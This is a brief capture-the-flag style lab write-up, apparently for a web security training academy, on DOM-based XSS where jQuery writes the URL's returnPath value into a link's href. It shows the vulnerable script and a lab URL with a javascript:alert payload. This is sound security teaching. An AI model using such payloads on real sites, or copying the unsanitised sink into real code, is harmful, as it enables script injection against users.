# **DOM XSS in jQuery anchor `href` attribute sink using `location.search` source**

So the whole deal in this lab is that the returnPath value in the URL is being used unsafely in a script:

<https://0a1500ba046e1250825a97c700630046.web-security-academy.net/feedback?returnPath=javascript:alert(%22ASD%22)>

```
<script>
    $(function() {
        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
</script>
```

The javascript:alert("ASD") will be inserted into the backlink anchor:

```
<a id="backLink" href="javascript:alert(&quot;ASD&quot;)">Back</a>
```
